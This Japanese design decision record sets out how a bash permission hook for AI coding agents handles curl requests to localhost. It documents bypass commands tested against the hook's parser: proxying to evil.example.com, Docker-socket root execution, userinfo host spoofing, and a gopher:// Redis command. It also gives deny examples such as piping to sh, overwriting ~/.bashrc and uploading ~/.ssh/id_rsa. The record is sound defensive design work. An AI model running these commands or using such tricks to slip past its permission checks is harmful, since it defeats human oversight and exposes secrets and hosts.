# ループバック宛 HTTP リクエストの承認緩和範囲

- **ステータス**: Accepted
- **日付**: 2026-09-01
- **決定者**: applejxd

## コンテキスト

`home/dot_claude/hooks/executable_check_bash.py` は `curl` / `wget` を
transfer 単位で解析し、読み取りを未掲載（CLI の auto / assisted 判定へ委譲）、
mutation を ask、秘密情報の送信・取得結果の直接実行・起動ファイルの上書きを
deny に分類している。詳細は [`docs/agents-permissions.md`](../agents-permissions.md)。

ローカル開発では `curl -X POST http://localhost:8000/api` のような
自マシン宛の mutation が頻出し、そのたびに ask が出る。
外部に出ないリクエストであるため、「localhost 宛は無条件で許可してよいのでは」
という前提で検討を始めた。

検討にあたり、既存パーサ `_http_transfer_calls()` に直接コマンドを投入して
挙動を実測した。結果、URL が localhost だけに見えるのに実際は外部到達または
特権操作になる形が複数あった。

| コマンド | パース結果 | 実際の挙動 |
| --- | --- | --- |
| `curl -X POST --proxy=http://evil.example.com http://localhost/x` | `urls=['http://localhost/x']` | プロキシ経由で外部へ送信 |
| `curl -X POST --unix-socket=/var/run/docker.sock http://localhost/containers/create` | `urls=['http://localhost/containers/create']` | Docker daemon 経由で実質 root RCE |
| `curl -X POST http://localhost@evil.example.com/x` | 同左 | userinfo。実ホストは `evil.example.com` |
| `curl -X POST "$URL"` | `urls=['$URL'] ambiguous=False` | 静的に判定不能 |
| `curl -d x=1 gopher://127.0.0.1:6379/_SET` | 同左 | ループバックだが Redis へ任意コマンド |
| `curl -X POST --connect-to example.com:80:127.0.0.1 http://localhost/x` | `urls=['example.com:80:127.0.0.1', 'http://localhost/x']` | 未知長オプションの値が URL に混入 |

つまり「URL 文字列に localhost が含まれるか」という素朴な判定は成立しない。

さらに、deny に例外を設けるかも論点になった。
curl 関連の deny 3 つが何を見ているかを整理すると次のとおりで、
いずれも「通信先」を見ていない。

| deny チェック | 見ている軸 | ループバックで消えるか |
| --- | --- | --- |
| `check_http_dangerous_output` | ローカルへの書き込み先（`curl -o ~/.bashrc`） | 消えない。宛先は判定に無関係 |
| `check_pipe_to_shell` | 取得内容の実行（`curl ... \| sh`） | 消えない。ローカルサーバは自前で立てられる |
| `check_curl_file_send` | 秘密の持ち出し（`curl -T ~/.ssh/id_rsa`） | 消えない。ローカルポートは外部へ中継されうる |

`common.toml` の ask 基準「1. 不可逆か / 2. 外部に見えるか / 3. 秘密や防御に触るか」
で言えば、ループバックが打ち消すのは 2 だけである。

加えて Copilot CLI は 1.0.53 以降、hook の ask を数十 ms で自動承認する
既知バグ（github/copilot-cli#3590）を抱えており、deny が実質唯一機能している層である。

## 検討した選択肢

### 選択肢 1: localhost 宛を無条件で許可する

URL に localhost / 127.0.0.1 が含まれれば deny / ask とも出さない。

- **利点**: 実装が最も単純。ローカル開発の摩擦がゼロになる
- **欠点**: 上表の bypass が全て通る。特に `--unix-socket` による Docker daemon
  操作と `--proxy` による外部送信は、緩和の意図を完全に外れる。
  deny も外れるため Copilot CLI では localhost 宛 curl が無防備になる

### 選択肢 2: URL のホスト名だけを見て ask を外す

deny は維持し、ask のみ URL のホスト名で判定する。

- **利点**: 実装が単純で、deny の砦は残る
- **欠点**: `--proxy` / `--unix-socket` / `--connect-to` / `-L` が
  ホスト名判定を無効化することを扱えない。userinfo や変数展開も誤判定する

### 選択肢 3: ask 層のみ、ローカルと確証できた場合に限り外す

deny 層は不変とし、`check_curl_wget_mutation` でのみ、
接続先を静的に確定できた `curl` に限って ask を外す。

- **利点**: 頻出するローカル開発の mutation は通る一方、
  緩和が及ぶ範囲が ask 層に閉じる。判定不能な形は全て従来どおり ask（fail-closed）
- **欠点**: 判定条件が増え、curl のオプション解析を強化する必要がある。
  `-L` を付けただけで ask に戻るなど、利用者から見て挙動の予測が難しい面が残る

### 選択肢 4: 現状維持（例外を設けない）

- **利点**: 攻撃面が増えない。判定ロジックが増えない
- **欠点**: ローカル開発中の ask が減らず、承認疲れで通しが雑になる

## 決定事項

**選択肢 3 を採用する。**

理由: 緩和の便益（ローカル開発の mutation）は ask 層だけで得られ、
deny を外して得られるのは `curl http://localhost/x | sh` や
`curl -o ~/.bashrc http://localhost/x` を通せることだけで、便益がほぼ無く損失が大きい。
選択肢 1 と 2 は実測した bypass を防げないため却下。
選択肢 4 は解決可能な摩擦を放置するため却下。

具体的な規則は次のとおり。

1. **例外は `ASK_CHECKS` の `check_curl_wget_mutation` にのみ置く。**
   `DENY_CHECKS` は `ASK_CHECKS` より先に実行されるため、
   この配置により deny へ波及しないことが構造的に保証される。
   deny 層に例外を設けないのは、上表のとおり curl の deny が
   「通信先」ではなく副作用の性質を見ているためである

2. **確証できないものは全てループバックと見なさない（fail-closed）。**
   `_is_local_url()` は判定に失敗したら `False` を返し、呼び出し側の
   既定動作（ask）を維持する。`$` / `` ` `` / curl の glob を含む URL、
   `http` / `https` 以外の scheme、`urlsplit().hostname` が
   `localhost` でも loopback アドレスでもないものは全て対象外。
   10 進・16 進表記（`2130706433` / `0x7f000001`）は `ipaddress` が
   拒否するため自動的に除外される

3. **接続先を URL から読み取れなくするオプションがあれば対象外にする。**
   `-x` / `--proxy` / `--socks*` / `--preproxy`、
   `--unix-socket` / `--abstract-unix-socket`、
   `--connect-to` / `--resolve` / `--interface` / `--dns-*`、`-K` / `--config`。
   リダイレクト追従（`-L` / `--location` / `--location-trusted`）も含める。
   短縮形の連結（`-fsSL`、`-xhttp://proxy`）と長オプションの
   曖昧な省略形（`--unix-sock=`）も取りこぼさない

4. **`wget` は例外の対象外とする。**
   `wget` は既定でリダイレクトを追うため、URL のホストが到達先を保証しない。
   `--max-redirect=0` の明示を条件にすることもできるが、
   便益に対して判定が複雑になるため tool 単位で除外する

5. **ループバックでも特権的な制御 API のポートは除外する。**
   Docker daemon (2375/2376/4243)、etcd (2379/2380)、
   Kubernetes API (6443/8443)、kubelet (10250/10255/10256)、
   Redis (6379)、memcached (11211)。
   `check_http_dangerous_output` の対象ファイル一覧と同様、
   hook 内のハードコード定数として持つ。
   `common.toml` は「人が書く 3 リスト」に用途を限定しているため

## 完了条件

- [x] `_is_local_url()` と `_UNSAFE_LOCAL_PORTS` を実装し、
      `check_curl_wget_mutation` から呼ぶ
- [x] `_parse_curl_tokens()` を強化し、`--connect-to` 等の値が URL へ
      混入する問題を修正、`blocks_local` を transfer 単位で記録する
- [x] `test/agents/test_check_bash_decision.py` に
      未掲載 11 件 / ask 維持 29 件 / deny 維持 6 件の回帰テストを追加
- [x] `docs/agents-permissions.md` に「ループバック宛の例外」節を追加し、
      `common.toml` の該当コメントを更新
- [x] `uvx pytest test/agents/` が全通過（1003 件）
- [x] `uv run pre-commit run --all-files` が全通過

## 結果

### ポジティブな結果

- `curl -X POST http://localhost:8000/api` や
  `curl -d @payload.json http://127.0.0.1:11434/api/generate` が承認なしで通る
- 「deny は副作用の性質で、ask は到達範囲で判定する」という層の役割分担が
  コード・テスト・ドキュメントに残った
- 例外の検討過程でパーサの既存の穴（`--connect-to` の値が URL に混入、
  `--proxy` の値が捨てられる）が見つかり、併せて塞がった。
  これは localhost 例外と無関係に `check_http_dangerous_output` の
  誤検知要因でもあった

### ネガティブな結果

- 判定条件が増え、利用者から見た挙動の予測が難しくなった。
  特に `-L` を足しただけで ask に戻る点は直感に反する
  （`docs/agents-permissions.md` に除外条件を列挙して緩和）
- 危険ポートの一覧が hook 内のハードコードであり、
  新しいローカル特権 API が現れたときに追随が必要
- ループバック宛の mutation について、hook が守るのは
  「秘密を送らない・実行しない・永続化しない」までになった。
  ローカルサービスの状態を壊す操作は CLI 側の auto / assisted 判定に委ねられる

### 中立的な結果

- `wget` と `curl` で扱いが非対称になった。
  リダイレクトの既定値が違う以上、同一に扱う方がむしろ不正確である
- 緩和の対象が ask 層に閉じたため、Copilot CLI の ask 自動承認バグ
  （github/copilot-cli#3590）が修正されても、されなくても挙動は変わらない

## 関連 ADR

- [ADR-0001](0001-external-tool-config-coexistence.md): 同じ hook / permission
  生成系を扱うが、対象は外部ツールとの設定領域の共存であり、
  本 ADR の判定ロジックとは独立している
